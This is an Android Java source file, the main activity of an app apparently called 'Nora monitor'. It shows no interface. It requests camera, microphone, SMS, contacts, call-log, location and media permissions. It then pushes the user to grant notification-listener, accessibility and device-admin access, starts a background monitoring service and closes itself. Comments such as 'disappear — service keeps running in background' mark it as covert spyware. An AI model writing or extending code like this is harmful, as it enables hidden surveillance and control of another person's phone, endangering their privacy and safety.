package com.nora.monitor;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int REQ_PERMISSIONS   = 1;
    private static final int REQ_DEVICE_ADMIN  = 2;
    private static final int REQ_NOTIFICATION  = 3;
    private static final int REQ_ACCESSIBILITY = 4;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // No setContentView — no UI at all
        requestRuntimePermissions();
    }

    // ── Step 1: runtime permissions ───────────────────────────────────────────

    private void requestRuntimePermissions() {
        List<String> needed = new ArrayList<>();
        String[] wanted = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
        };
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            needed.add(Manifest.permission.READ_MEDIA_IMAGES);
            needed.add(Manifest.permission.READ_MEDIA_VIDEO);
            needed.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        for (String p : wanted) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) needed.add(p);
        }
        if (!needed.isEmpty()) {
            requestPermissions(needed.toArray(new String[0]), REQ_PERMISSIONS);
        } else {
            afterRuntimePermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grants) {
        // We don't block on denials — service runs with whatever was granted
        if (requestCode == REQ_PERMISSIONS) afterRuntimePermissions();
    }

    // ── Step 2: notification listener access ─────────────────────────────────

    private void afterRuntimePermissions() {
        if (!isNotificationListenerEnabled()) {
            Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivityForResult(i, REQ_NOTIFICATION);
        } else {
            afterNotificationAccess();
        }
    }

    private boolean isNotificationListenerEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(),
            "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }

    // ── Step 3: accessibility service ─────────────────────────────────────────

    private void afterNotificationAccess() {
        if (!isAccessibilityEnabled()) {
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivityForResult(i, REQ_ACCESSIBILITY);
        } else {
            afterAccessibility();
        }
    }

    private boolean isAccessibilityEnabled() {
        try {
            int enabled = Settings.Secure.getInt(getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            if (enabled == 0) return false;
            String flat = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return flat != null && flat.toLowerCase()
                .contains(getPackageName().toLowerCase());
        } catch (Exception e) { return false; }
    }

    // ── Step 4: device admin ──────────────────────────────────────────────────

    private void afterAccessibility() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, NoraDeviceAdmin.class);
        if (dpm != null && !dpm.isAdminActive(admin)) {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required to lock the screen remotely.");
            startActivityForResult(i, REQ_DEVICE_ADMIN);
        } else {
            launch();
        }
    }

    // ── onActivityResult covers notifications, accessibility and device admin ─

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        switch (requestCode) {
            case REQ_NOTIFICATION:  afterNotificationAccess(); break;
            case REQ_ACCESSIBILITY: afterAccessibility();      break;
            case REQ_DEVICE_ADMIN:  launch();                  break;
        }
    }

    // ── Final step: start service and exit ────────────────────────────────────

    private void launch() {
        Intent svc = new Intent(this, MonitorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }
        finish(); // disappear — service keeps running in background
    }
}
